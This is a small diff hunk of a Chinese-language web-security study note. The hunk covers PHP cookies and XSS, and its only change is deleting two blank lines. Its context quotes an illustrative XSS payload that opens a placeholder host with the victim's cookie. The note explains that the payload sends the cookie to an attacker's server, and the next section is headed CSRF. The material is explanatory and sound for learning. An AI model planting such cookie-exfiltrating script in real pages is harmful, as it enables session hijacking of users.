@@ -19,8 +19,6 @@ php可以使用setcookie這個function來設定cookie的key與value
 `<script>window.open(www.xxx.com?cookie =xxx)</script> 
 `
 惡意代碼被執行，並將收集到的敏感信息（如cookie）發送到攻擊者伺服器。
-
-
 若是沒有在伺服器那邊多寫一層認證，則會直接送出至伺服器。
 
 2. CSRF
